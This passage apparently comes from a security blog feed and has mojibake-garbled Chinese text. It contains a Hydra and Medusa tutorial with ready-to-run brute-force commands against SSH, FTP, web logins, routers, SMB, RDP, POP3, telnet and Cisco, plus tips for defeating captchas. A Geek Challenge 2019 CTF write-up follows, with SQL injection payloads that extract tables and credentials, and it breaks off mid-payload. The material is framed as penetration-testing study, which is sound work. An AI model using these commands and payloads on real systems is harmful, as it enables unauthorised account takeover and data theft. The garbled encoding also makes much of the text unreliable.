class="language-bash">serviceÔºöÊåáÂÆöÊúçÂä°ÂêçÔºåÊîØÊåÅÁöÑÊúçÂä°Ë∑üÂçèËÆÆÊúâÔºötelnetÔºåftpÔºåpop3Á≠âÁ≠â„ÄÇÊ≥®ÊÑèÁÇπÔºö<span class="token number">1</span>.Ëá™Â∑±ÂàõÂª∫Â≠óÂÖ∏,ÁÑ∂ÂêéÊîæÂú®ÂΩìÂâçÁöÑÁõÆÂΩï‰∏ãÊàñËÄÖÊåáÂÆöÁõÆÂΩï„ÄÇ<span class="token number">2</span>.ÂèÇÊï∞ÂèØ‰ª•Áªü‰∏ÄÊîæÂú®ÊúÄÂêéÔºåÊ†ºÂºèÊØîÂ¶Çhydra <span class="token function">ip</span> ÊúçÂä° ÂèÇÊï∞„ÄÇ<span class="token number">3</span>.Â¶ÇÊûúËÉΩÁ°ÆÂÆöÁî®Êà∑Âêç‰∏ÄÈ°πÊó∂ÂÄôÔºåÊØîÂ¶ÇwebÁôªÂΩïÁ†¥Ëß£ÔºåÁõ¥Êé•Áî® -lÂ∞±ÂèØ‰ª•ÔºåÁÑ∂ÂêéÂâ©‰ΩôÊó∂Èó¥Á†¥Ëß£ÂØÜÁ†Å„ÄÇ<span class="token number">4</span>.Áº∫ÁÇπÔºåÂ¶ÇÊûúÁõÆÊ†áÁΩëÁ´ôÁôªÂΩïÊó∂ÂÄôÈúÄË¶ÅÈ™åËØÅÁ†ÅÂ∞±Êó†Ê≥ïÁ†¥Ëß£„ÄÇ<span class="token number">5</span>.man hydraÊúÄ‰∏áËÉΩ„ÄÇ<span class="token number">6</span>.ÊàñËÄÖhydra <span class="token parameter variable">-U</span> http-formÁ≠âÊü•ÁúãÂÖ∑‰ΩìÂ∏ÆÂä©„ÄÇ</code></pre><h5 id="KailÂ≠óÂÖ∏"><a href="#KailÂ≠óÂÖ∏" class="headerlink" title="KailÂ≠óÂÖ∏"></a>KailÂ≠óÂÖ∏</h5><p>Âú®kail‰∏≠ÊòØËá™Â∏¶Â≠óÂÖ∏ÁöÑÔºåÂèØ‰ª•ÈÄöËøá&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbË∑ØÂæÑËøõË°åÊü•ÁúãÔºåÂΩìÁÑ∂ÈÉΩÊòØtxtÊñá‰ª∂Ôºå‰πüÂèØ‰ª•Ëá™Â∑±ÂêëÈáåÈù¢Ê∑ªÂä†„ÄÇ</p><table><thead><tr><th>Êñá‰ª∂Âêç</th><th>‰ªãÁªç</th></tr></thead><tbody><tr><td>big.txt</td><td>Â§ßÁöÑÂ≠óÂÖ∏</td></tr><tr><td>small.txt</td><td>Â∞èÁöÑÂ≠óÂÖ∏</td></tr><tr><td>catala.txt</td><td>È°πÁõÆÈÖçÁΩÆÂ≠óÂÖ∏</td></tr><tr><td>common.txt</td><td>ÂÖ¨ÂÖ±Â≠óÂÖ∏</td></tr><tr><td>euskera.txt</td><td>Êï∞ÊçÆÁõÆÂΩïÂ≠óÂÖ∏</td></tr><tr><td>extensions_common.txt</td><td>Â∏∏Áî®Êñá‰ª∂Êâ©Â±ïÂêçÂ≠óÂÖ∏</td></tr><tr><td>indexes.txt</td><td>È¶ñÈ°µÂ≠óÂÖ∏</td></tr><tr><td>mutations_common.txt</td><td>Â§á‰ªΩÊâ©Â±ïÂêç</td></tr><tr><td>spanish.txt</td><td>ÊñπÊ≥ïÂêçÊàñÂ∫ìÁõÆÂΩï</td></tr><tr><td>others</td><td>Êâ©Â±ïÁõÆÂΩïÔºåÈªòËÆ§Áî®Êà∑Âêç„ÄÅÈªòËÆ§ÂØÜÁ†ÅÁ≠â</td></tr><tr><td>stress</td><td>ÂéãÂäõÊµãËØï</td></tr><tr><td>vulns</td><td>ÊºèÊ¥ûÊµãËØï</td></tr></tbody></table><h5 id="HydraÂØÜÁ†ÅÁîüÊàêÂô®"><a href="#HydraÂØÜÁ†ÅÁîüÊàêÂô®" class="headerlink" title="HydraÂØÜÁ†ÅÁîüÊàêÂô®"></a>HydraÂØÜÁ†ÅÁîüÊàêÂô®</h5><table><thead><tr><th>ÂèÇÊï∞</th><th>‰ªãÁªç</th></tr></thead><tbody><tr><td>-x MIN:MAX:CHARSET ÂØÜÁ†ÅÊö¥ÂäõÁ†¥Ëß£ÁîüÊàêÂô®</td><td>ËßÑÂàôÔºöMINË°®Á§∫ÁîüÊàêÂØÜÁ†ÅÁöÑÊúÄÁü≠ÈïøÂ∫¶ÔºõMAXË°®Á§∫ÁîüÊàêÂØÜÁ†ÅÁöÑÊúÄÈïøÈïøÂ∫¶ÔºõCHARSETË°®Á§∫‰ΩøÁî®ÊåáÂÆöÁöÑÂ≠óÁ¨¶ÁîüÊàêÂØÜÁ†ÅÔºå‚Äôa‚ÄôË°®Á§∫ÊâÄÊúâÁöÑÂ∞èÂÜôÂ≠óÊØçÔºå‚ÄôA‚ÄôË°®Á§∫ÊâÄÊúâÁöÑÂ§ßÂÜôÂ≠óÊØç,‚Äô1‚ÄôË°®Á§∫ÊâÄÊúâÁöÑÊï∞Â≠óÔºåÂØπ‰∫éÂÖ∂‰ªñÂ≠óÁ¨¶ÔºåÂè™ÈúÄË¶ÅÊ∑ªÂä†Âú®ÂêéÈù¢Âç≥ÂèØ</td></tr><tr><td>-y</td><td>‰ΩøÁî®ÊñπÂºèËßÅ-xÔºåÂÆÉË°®Á§∫charsetÁöÑÂ≠óÁ¨¶ÊòØÂÆûÈôÖÁöÑÂ≠óÁ¨¶ÔºåËÄå‰∏çÊòØÊ≠£ÂàôË°®ËææÂºè</td></tr><tr><td>-x 3:5:a</td><td>ÁîüÊàêÁöÑÂØÜÁ†ÅÂ≠óÂÖ∏ÈïøÂ∫¶‰∏∫3Âà∞5‰ΩçÔºåÁî±ÊâÄÊúâÁöÑÂ∞èÂÜôÂ≠óÊØçÁªÑÊàê</td></tr><tr><td>-x 5:8:A1</td><td>ÁîüÊàêÁöÑÂØÜÁ†ÅÂ≠óÂÖ∏ÈïøÂ∫¶‰∏∫5Âà∞8‰ΩçÔºåÊúâÊâÄÊúâÁöÑÂ§ßÂÜôÂ≠óÊØçÂíåÊï∞Â≠óÁªÑÊàê</td></tr><tr><td>-x 5:5&#x2F;%,.-</td><td>ÁîüÊàêÁöÑÂØÜÁ†ÅÂ≠óÂÖ∏ÈïøÂ∫¶‰∏∫5‰ΩçÔºåÂè™Áî±‚Äô&#x2F; % , . -‚ÄòËøô5ÁßçÂ≠óÁ¨¶ÊûÑÊàê</td></tr><tr><td>-x 3:5:aA1 -y</td><td>ÁîüÊàêÁöÑÂØÜÁ†ÅÂ≠óÂÖ∏ÈïøÂ∫¶‰∏∫3Âà∞5‰ΩçÔºå‰∏îÂè™Áî±‚Äôa A 1‚ÄôËøô‰∏âÁßçÂ≠óÁ¨¶ÁªÑÊàê</td></tr><tr><td>-x 3:5:aA1.-+#</td><td>ÁîüÊàêÁöÑÂØÜÁ†ÅÂ≠óÂÖ∏ÈïøÂ∫¶‰∏∫3Âà∞8‰ΩçÔºåÁî±Â§ßÂ∞èÂÜôÂ≠óÊØç+Êï∞Â≠ó+.-+#ËøõË°åÁªÑÂêà„ÄÇ</td></tr></tbody></table><h5 id="HydraÊ°à‰æã"><a href="#HydraÊ°à‰æã" class="headerlink" title="HydraÊ°à‰æã"></a>HydraÊ°à‰æã</h5><h6 id="Êö¥Á†¥sshÁôªÂΩïÂØÜÁ†Å"><a href="#Êö¥Á†¥sshÁôªÂΩïÂØÜÁ†Å" class="headerlink" title="Êö¥Á†¥sshÁôªÂΩïÂØÜÁ†Å"></a>Êö¥Á†¥sshÁôªÂΩïÂØÜÁ†Å</h6><p>‰∏∫‰∫ÜÊµãËØïÊñπ‰æøÔºåÊàë‰ª¨ÂàõÂª∫‰∏§‰∏™ÁÆÄÂçïÁöÑÂ≠óÂÖ∏Êñá‰ª∂</p><p>Ê†πÊçÆÂëΩ‰ª§ÂèÇÊï∞ÔºåÁªÑÁªáÂèÇÊï∞Ê†ºÂºèÂ¶Ç‰∏ãÔºö</p><pre class="language-ruby" data-language="ruby"><code class="language-ruby">root<span class="token variable">@kali</span><span class="token operator">:</span><span class="token operator">/</span>mnt<span class="token comment"># hydra -L user.txt -P password.txt -t 2 -vV -e ns 192.168.154.131 ssh</span></code></pre><h6 id="FTPÂçèËÆÆÁ†¥Ëß£"><a href="#FTPÂçèËÆÆÁ†¥Ëß£" class="headerlink" title="FTPÂçèËÆÆÁ†¥Ëß£"></a>FTPÂçèËÆÆÁ†¥Ëß£</h6><pre class="language-css" data-language="css"><code class="language-css">Á†¥Ëß£ftpÔºöhydra -L Áî®Êà∑ÂêçÂ≠óÂÖ∏ -P ÂØÜÁ†ÅÂ≠óÂÖ∏ -t 6 -e ns IPÂú∞ÂùÄ -v</code></pre><h6 id="httpÂçèËÆÆÁ†¥Ëß£"><a href="#httpÂçèËÆÆÁ†¥Ëß£" class="headerlink" title="httpÂçèËÆÆÁ†¥Ëß£"></a>httpÂçèËÆÆÁ†¥Ëß£</h6><pre class="language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">get</span>ÊñπÂºèÊèê‰∫§ÔºåÁ†¥Ëß£webÁôªÂΩïÔºöhydra <span class="token operator">-</span>L Áî®Êà∑ÂêçÂ≠óÂÖ∏ <span class="token operator">-</span>P ÂØÜÁ†ÅÂ≠óÂÖ∏ <span class="token operator">-</span>t Á∫øÁ®ã <span class="token operator">-</span>v <span class="token operator">-</span>e ns IPÂú∞ÂùÄ http<span class="token operator">-</span><span class="token keyword">get</span> <span class="token operator">/</span>admin<span class="token operator">/</span>hydra <span class="token operator">-</span>L Áî®Êà∑ÂêçÂ≠óÂÖ∏ <span class="token operator">-</span>P ÂØÜÁ†ÅÂ≠óÂÖ∏ <span class="token operator">-</span>t Á∫øÁ®ã <span class="token operator">-</span>v <span class="token operator">-</span>e ns <span class="token operator">-</span>f IPÂú∞ÂùÄ http<span class="token operator">-</span><span class="token keyword">get</span> <span class="token operator">/</span>admin<span class="token operator">/</span>index<span class="token punctuation">.</span>phppostÊñπÂºèÊèê‰∫§ÔºåÁ†¥Ëß£webÁôªÂΩïÔºöhydra <span class="token operator">-</span>f <span class="token operator">-</span>l Áî®Êà∑Âêç <span class="token operator">-</span>P ÂØÜÁ†ÅÂ≠óÂÖ∏ <span class="token operator">-</span>V <span class="token operator">-</span>s <span class="token number">9900</span> IPÂú∞ÂùÄ http<span class="token operator">-</span>post<span class="token operator">-</span>form <span class="token string">"/admin/index.php?action=login:user=USER&amp;pw=PASS:"</span><span class="token preprocessor property">#/index.php ‚Ä¶Ëøô‰∏™ÊòØÁôªÂΩïÁöÑ url</span><span class="token preprocessor property">#ÂêéÈó®ÊòØPOSTÁöÑÊï∞ÊçÆ ÂÖ∂‰∏≠ÁöÑÁî®Êà∑ÂêçÂØÜÁ†Å‰ΩøÁî® USER PASS Êù•‰ª£Êõø</span><span class="token preprocessor property">#ÁÑ∂ÂêéÊòØÂ¶ÇÊûúÁôªÂΩïÂá∫Èîô ‰ºöÂá∫Áé∞ÁöÑÂ≠óÁ¨¶ „ÄÇ„ÄÇ„ÄÇÁÑ∂ÂêéÂºÄÂßãÁ†¥Ëß£</span></code></pre><h6 id="httpsÂçèËÆÆÁ†¥Ëß£"><a href="#httpsÂçèËÆÆÁ†¥Ëß£" class="headerlink" title="httpsÂçèËÆÆÁ†¥Ëß£"></a>httpsÂçèËÆÆÁ†¥Ëß£</h6><pre class="language-bash" data-language="bash"><code class="language-bash">Á†¥Ëß£httpshydra <span class="token parameter variable">-m</span> /index.php <span class="token parameter variable">-l</span> Áî®Êà∑Âêç <span class="token parameter variable">-P</span> ÂØÜÁ†ÅÂ≠óÂÖ∏.txt IPÂú∞ÂùÄ https</code></pre><h6 id="Ë∑ØÁî±Âô®Á†¥Ëß£"><a href="#Ë∑ØÁî±Âô®Á†¥Ëß£" class="headerlink" title="Ë∑ØÁî±Âô®Á†¥Ëß£"></a>Ë∑ØÁî±Âô®Á†¥Ëß£</h6><pre class="language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-l</span> admin <span class="token parameter variable">-x</span> <span class="token number">6</span>:10:1a.~<span class="token operator">!</span>@<span class="token comment">#$%^&amp;()-= -t 8 192.168.1.1 http-get /</span><span class="token parameter variable">-l</span> admin ‰∏∫Â∞ùËØïÁ†¥Ëß£ÁöÑÁî®Êà∑Âêç„ÄÇ<span class="token comment"># -x 6:10:1a. Ë°®Á§∫Êûö‰∏æÁöÑÂØÜÁ†ÅÁî± Êï∞Â≠ó„ÄÅÂ∞èÂÜôÂ≠óÊØçÂíåÂçïÂ≠óÁ¨¶‚Äô.'Á≠âÁ≠âÁªÑÊàêÔºåÈïøÂ∫¶‰∏∫ 6 - 10 ‰Ωç„ÄÇ-t 8 Ë°®Á§∫ÂàÜ 8 ‰∏™Âπ∂Ë°å‰ªªÂä°ËøõË°åÁàÜÁ†¥Â∞ùËØï„ÄÇ192.168.1.1 ‰∏∫ Router Âú∞ÂùÄ„ÄÇhttp-get ‰∏∫Á†¥Ëß£ÊñπÂºèÔºàÂçèËÆÆÔºâ</span></code></pre><h6 id="http-proxyÂçèËÆÆÁ†¥Ëß£"><a href="#http-proxyÂçèËÆÆÁ†¥Ëß£" class="headerlink" title="http-proxyÂçèËÆÆÁ†¥Ëß£"></a>http-proxyÂçèËÆÆÁ†¥Ëß£</h6><pre class="language-cpp" data-language="cpp"><code class="language-cpp">Á†¥Ëß£http<span class="token operator">-</span>proxyÔºöhydra <span class="token operator">-</span>l admin <span class="token operator">-</span>P Â≠óÂÖ∏<span class="token punctuation">.</span>txt http<span class="token operator">-</span>proxy<span class="token operator">:</span><span class="token comment">//IPÂú∞ÂùÄ</span></code></pre><h6 id="smbÁ†¥Ëß£"><a href="#smbÁ†¥Ëß£" class="headerlink" title="smbÁ†¥Ëß£"></a>smbÁ†¥Ëß£</h6><pre class="language-css" data-language="css"><code class="language-css">Á†¥Ëß£smbÔºöhydra -l Áî®Êà∑ÂêçÂ≠óÂÖ∏ -P ÂØÜÁ†ÅÂ≠óÂÖ∏ IPÂú∞ÂùÄ smb</code></pre><h6 id="WindowsËøúÁ®ãÊ°åÈù¢"><a href="#WindowsËøúÁ®ãÊ°åÈù¢" class="headerlink" title="WindowsËøúÁ®ãÊ°åÈù¢"></a>WindowsËøúÁ®ãÊ°åÈù¢</h6><pre class="language-scss" data-language="scss"><code class="language-scss">Á†¥Ëß£<span class="token function">rdp</span><span class="token punctuation">(</span>windowsËøúÁ®ãÁôªÂΩï<span class="token punctuation">)</span>Ôºöhydra ipÂú∞ÂùÄ rdp -l administrator -P ÂØÜÁ†ÅÂ≠óÂÖ∏.txt -V</code></pre><h6 id="ÈÇÆÁÆ±pop3"><a href="#ÈÇÆÁÆ±pop3" class="headerlink" title="ÈÇÆÁÆ±pop3"></a>ÈÇÆÁÆ±pop3</h6><pre class="language-css" data-language="css"><code class="language-css">Á†¥Ëß£ÈÇÆÁÆ±pop3Ôºöhydra -l Áî®Êà∑Âêç -P ÂØÜÁ†ÅÂ≠óÂÖ∏.txt my.pop3.mail pop3</code></pre><h6 id="telnetÁ†¥Ëß£"><a href="#telnetÁ†¥Ëß£" class="headerlink" title="telnetÁ†¥Ëß£"></a>telnetÁ†¥Ëß£</h6><pre class="language-css" data-language="css"><code class="language-css">hydra ipÂú∞ÂùÄ telnet -l Áî®Êà∑Â≠óÂÖ∏.txt -P ÂØÜÁ†ÅÂ≠óÂÖ∏.txt -t 32 -s 23 -e ns -f -V</code></pre><h6 id="ËØ≠Èü≥ÈÄöËÆØÂ∑•ÂÖ∑teamspeak"><a href="#ËØ≠Èü≥ÈÄöËÆØÂ∑•ÂÖ∑teamspeak" class="headerlink" title="ËØ≠Èü≥ÈÄöËÆØÂ∑•ÂÖ∑teamspeak"></a>ËØ≠Èü≥ÈÄöËÆØÂ∑•ÂÖ∑teamspeak</h6><pre class="language-css" data-language="css"><code class="language-css">hydra -l Áî®Êà∑ÂêçÂ≠óÂÖ∏ -P ÂØÜÁ†ÅÂ≠óÂÖ∏.txt -s Á´ØÂè£Âè∑ -vV ip teamspeak</code></pre><h6 id="cisco"><a href="#cisco" class="headerlink" title="cisco"></a>cisco</h6><pre class="language-css" data-language="css"><code class="language-css">hydra -P ÂØÜÁ†ÅÂ≠óÂÖ∏ IPÂú∞ÂùÄ ciscohydra -m cloud -P ÂØÜÁ†ÅÂ≠óÂÖ∏ IPÂú∞ÂùÄ cisco-enable</code></pre><h4 id="medusa-ÁæéÊùúËéé"><a href="#medusa-ÁæéÊùúËéé" class="headerlink" title="medusa(ÁæéÊùúËéé)"></a>medusa(ÁæéÊùúËéé)</h4><h5 id="ÁÆÄ‰ªã-4"><a href="#ÁÆÄ‰ªã-4" class="headerlink" title="ÁÆÄ‰ªã"></a>ÁÆÄ‰ªã</h5><p>Medusa(ÁæéÊùúËéé)ÊòØ‰∏Ä‰∏™ÈÄüÂ∫¶Âø´ÔºåÊîØÊåÅÂ§ßËßÑÊ®°Âπ∂Ë°åÔºåÊ®°ÂùóÂåñÔºåÁàÜÁ†¥ÁôªÂΩï„ÄÇÂèØ‰ª•ÂêåÊó∂ÂØπÂ§ö‰∏™‰∏ªÊú∫ÔºåÁî®Êà∑ÊàñÂØÜÁ†ÅÊâßË°åÂº∫ÂäõÊµãËØï„ÄÇMedusa Âíå hydra ‰∏ÄÊ†∑ÔºåÂêåÊ†∑Â±û‰∫éÂú®Á∫øÂØÜÁ†ÅÁ†¥Ëß£Â∑•ÂÖ∑„ÄÇ‰∏çÂêåÁöÑÊòØÔºåmedusa ÁöÑÁ®≥ÂÆöÊÄßÁõ∏ËæÉ‰∫é hydra Ë¶ÅÂ•ΩÂæàÂ§öÔºå‰ΩÜÂÖ∂ÊîØÊåÅÊ®°ÂùóË¶ÅÊØî hydra Â∞ë‰∏Ä‰∫õ„ÄÇ</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># medusaÊîØÊåÅ‰∏Ä‰∏ãÂçèËÆÆ</span>AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP <span class="token punctuation">(</span>NetWare<span class="token punctuation">)</span>,NNTP, PcAnywhere, POP3, PostgreSQL, rexec, RDP„ÄÅrlogin, rsh, SMBNT, SMTP<span class="token punctuation">(</span>AUTH/VRFY<span class="token punctuation">)</span>, SNMP, SSHv2, SVN, Telnet, VmAuthd, VNC„ÄÅGeneric Wrapper‰ª•ÂèäWebË°®Âçï</code></pre><h5 id="‰ΩøÁî®ËØ≠Ê≥ïÂíåÂèÇÊï∞-3"><a href="#‰ΩøÁî®ËØ≠Ê≥ïÂíåÂèÇÊï∞-3" class="headerlink" title="‰ΩøÁî®ËØ≠Ê≥ïÂíåÂèÇÊï∞"></a>‰ΩøÁî®ËØ≠Ê≥ïÂíåÂèÇÊï∞</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ‰ΩøÁî®ËØ≠Ê≥ï</span>medusa <span class="token punctuation">[</span>options<span class="token punctuation">]</span> <span class="token parameter variable">-h</span> <span class="token operator">&lt;</span>ÁõÆÊ†á‰∏ªÊú∫<span class="token operator">></span> <span class="token parameter variable">-u</span> <span class="token operator">&lt;</span>Áî®Êà∑Âêç<span class="token operator">></span> <span class="token parameter variable">-P</span> <span class="token operator">&lt;</span>ÂØÜÁ†ÅÂ≠óÂÖ∏Êñá‰ª∂<span class="token operator">></span><span class="token comment"># -h ÂèÇÊï∞ÊåáÂÆöË¶ÅÁ†¥Ëß£ÁöÑÁõÆÊ†á‰∏ªÊú∫IPÊàñÂüüÂêçÔºå-u ÂèÇÊï∞ÊåáÂÆöË¶ÅÁ†¥Ëß£ÁöÑÁî®Êà∑ÂêçÔºå-P ÂèÇÊï∞ÊåáÂÆöÂØÜÁ†ÅÂ≠óÂÖ∏Êñá‰ª∂Ë∑ØÂæÑ</span></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-h</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#ÁõÆÊ†áIP</span><span class="token parameter variable">-H</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>    <span class="token comment">#ÁõÆÊ†á‰∏ªÊú∫Êñá‰ª∂</span><span class="token parameter variable">-u</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#Áî®Êà∑Âêç</span><span class="token parameter variable">-U</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>    <span class="token comment">#Áî®Êà∑ÂêçÊñá‰ª∂</span><span class="token parameter variable">-p</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#ÂØÜÁ†Å;</span><span class="token parameter variable">-P</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>    <span class="token comment">#ÂØÜÁ†ÅÊñá‰ª∂</span><span class="token parameter variable">-C</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>    <span class="token comment">#ÁªÑÂêàÊù°ÁõÆÊñá‰ª∂</span><span class="token parameter variable">-O</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>    <span class="token comment">#Êñá‰ª∂Êó•Âøó‰ø°ÊÅØ</span><span class="token parameter variable">-e</span> <span class="token punctuation">[</span>n/s/ns<span class="token punctuation">]</span>    <span class="token comment">#NÊÑè‰∏∫Á©∫ÂØÜÁ†ÅÔºåSÊÑè‰∏∫ÂØÜÁ†Å‰∏éÁî®Êà∑ÂêçÁõ∏Âêå;ÊåáÂÆöË¶ÅÊéíÈô§ÁöÑÂØÜÁ†ÅÔºåÂèØ‰ª•‰ΩøÁî®Ê≠£ÂàôË°®ËææÂºè„ÄÇ</span><span class="token parameter variable">-M</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#Ê®°ÂùóÊâßË°åÂêçÁß∞</span><span class="token parameter variable">-m</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#‰º†ÈÄíÂèÇÊï∞Âà∞Ê®°Âùó</span><span class="token parameter variable">-d</span>    <span class="token comment">#ÊòæÁ§∫ÊâÄÊúâÁöÑÊ®°ÂùóÂêçÁß∞</span><span class="token parameter variable">-n</span> <span class="token punctuation">[</span>NUM<span class="token punctuation">]</span>    <span class="token comment">#‰ΩøÁî®ÈùûÈªòËÆ§Á´ØÂè£</span><span class="token parameter variable">-s</span>    <span class="token comment">#ÂêØÁî®SSL</span><span class="token parameter variable">-r</span> <span class="token punctuation">[</span>NUM<span class="token punctuation">]</span>    <span class="token comment">#ÈáçËØïÈó¥ÈöîÊó∂Èó¥ÔºåÈªòËÆ§‰∏∫3Áßí</span><span class="token parameter variable">-t</span> <span class="token punctuation">[</span>NUM<span class="token punctuation">]</span>    <span class="token comment">#ËÆæÂÆöÁ∫øÁ®ãÊï∞Èáè</span><span class="token parameter variable">-L</span>    <span class="token comment">#Âπ∂Ë°åÂåñÔºåÊØè‰∏™Áî®Êà∑‰ΩøÁî®‰∏Ä‰∏™Á∫øÁ®ã</span><span class="token parameter variable">-f</span>    <span class="token comment">#Âú®‰ªª‰Ωï‰∏ªÊú∫‰∏äÊâæÂà∞Á¨¨‰∏Ä‰∏™Ë¥¶Âè∑/ÂØÜÁ†ÅÂêéÔºåÂÅúÊ≠¢Á†¥Ëß£</span><span class="token parameter variable">-q</span>    <span class="token comment">#ÊòæÁ§∫Ê®°ÂùóÁöÑ‰ΩøÁî®‰ø°ÊÅØ</span><span class="token parameter variable">-v</span> <span class="token punctuation">[</span>NUM<span class="token punctuation">]</span>    <span class="token comment">#ËØ¶ÁªÜÁ∫ßÂà´Ôºà0-6Ôºâ</span><span class="token parameter variable">-w</span> <span class="token punctuation">[</span>NUM<span class="token punctuation">]</span>    <span class="token comment">#ÈîôËØØË∞ÉËØïÁ∫ßÂà´Ôºà0-10Ôºâ</span><span class="token parameter variable">-V</span>    <span class="token comment">#ÊòæÁ§∫ÁâàÊú¨</span><span class="token parameter variable">-Z</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#ÁªßÁª≠Êâ´Êèè‰∏ä‰∏ÄÊ¨°</span></code></pre><h5 id="Â∏∏ËßÅÁî®Ê≥ï"><a href="#Â∏∏ËßÅÁî®Ê≥ï" class="headerlink" title="Â∏∏ËßÅÁî®Ê≥ï"></a>Â∏∏ËßÅÁî®Ê≥ï</h5><h6 id="sshÁàÜÁ†¥"><a href="#sshÁàÜÁ†¥" class="headerlink" title="sshÁàÜÁ†¥"></a>sshÁàÜÁ†¥</h6><pre class="language-python" data-language="python"><code class="language-python">medusa <span class="token operator">-</span>M ssh <span class="token operator">-</span>h <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.131</span> <span class="token operator">-</span>u root <span class="token operator">-</span>P <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>john<span class="token operator">/</span>password<span class="token punctuation">.</span>lst <span class="token operator">-</span>f<span class="token triple-quoted-string string">'''-hÔºöË¶ÅÁàÜÁ†¥ÁöÑÁõÆÊ†á‰∏ªÊú∫IPÂú∞ÂùÄ 192.168.56.131-lÔºöË¶ÅÁàÜÁ†¥ÁöÑÁî®Êà∑Âêç root-PÔºöË¶ÅÁàÜÁ†¥ÁöÑÂØÜÁ†ÅÂ≠óÂÖ∏ Áî®ÁöÑÂ≠óÂÖ∏ÊòØËá™Â∑±ÂºÑÁöÑ-MÔºöË∞ÉÁî®Ê®°ÂùósshÊâßË°å-fÔºö‰∏ÄÊó¶ÁàÜÁ†¥ÊàêÂäü‰∏Ä‰∏™Â∞±Á´ãÂç≥ÂÅúÊ≠¢ÁàÜÁ†¥'''</span></code></pre><h6 id="ÁàÜÁ†¥WindowsËøúÁ®ãËøúÁ®ãÊ°åÈù¢ÂçèËÆÆ-smbnt-3389"><a href="#ÁàÜÁ†¥WindowsËøúÁ®ãËøúÁ®ãÊ°åÈù¢ÂçèËÆÆ-smbnt-3389" class="headerlink" title="ÁàÜÁ†¥WindowsËøúÁ®ãËøúÁ®ãÊ°åÈù¢ÂçèËÆÆ(smbnt)3389"></a>ÁàÜÁ†¥WindowsËøúÁ®ãËøúÁ®ãÊ°åÈù¢ÂçèËÆÆ(smbnt)3389</h6><pre class="language-python" data-language="python"><code class="language-python">medusa <span class="token operator">-</span>M smbnt <span class="token operator">-</span>h <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.132</span> <span class="token operator">-</span>u Administrator <span class="token operator">-</span>P <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>john<span class="token operator">/</span>password<span class="token punctuation">.</span>lst <span class="token operator">-</span>f<span class="token triple-quoted-string string">'''-hÔºöË¶ÅÁàÜÁ†¥ÁöÑÁõÆÊ†á‰∏ªÊú∫IPÂú∞ÂùÄ 192.168.56.132-lÔºöË¶ÅÁàÜÁ†¥ÁöÑÁî®Êà∑Âêç Administrator-PÔºöË¶ÅÁàÜÁ†¥ÁöÑÂØÜÁ†ÅÂ≠óÂÖ∏ /usr/share/john/password.lst-MÔºöË∞ÉÁî®smbntÊ®°ÂùóÊâßË°å-fÔºö‰∏ÄÊó¶ÁàÜÁ†¥ÊàêÂäü‰∏Ä‰∏™Â∞±Á´ãÂç≥ÂÅúÊ≠¢ÁàÜÁ†¥'''</span></code></pre><p>Ps: È™åËØÅÁ†ÅÁàÜÁ†¥ÂèØ‰ª•‰ΩøÁî®ddddocrÂíåcaptcha-killer-modified</p>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> Ê∏óÈÄèÊµãËØï </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Êö¥ÂäõÁ†¥Ëß£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÊûÅÂÆ¢Â§ßÊåëÊàò2019-web</title>
      <link href="/2024/08/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/"/>
      <url>/2024/08/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/</url>
      
        <content type="html"><![CDATA[<h4 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h4><p><img src="easysql.png" loading="lazy"></p><p>Á≠æÂà∞È¢ò</p><h4 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h4><p>Âü∫Êú¨Ê≤°Âï•ËøáÊª§</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>username<span class="token operator">=</span>a<span class="token string single-quoted-string">' union select 1,2,3%23&amp;password=111# Êü•Ë°®Âêç geekuser,l0ve1ysq1?username=a'</span> union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> from information_schema<span class="token operator">.</span>tables where table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">111</span><span class="token comment"># Êü•Â∫ìÂêç id,username,password</span><span class="token operator">?</span>username<span class="token operator">=</span>a<span class="token string single-quoted-string">' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='</span>l0ve1ysq1<span class="token string single-quoted-string">'%23&amp;password=111# getFlag?username=a'</span> union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">,</span><span 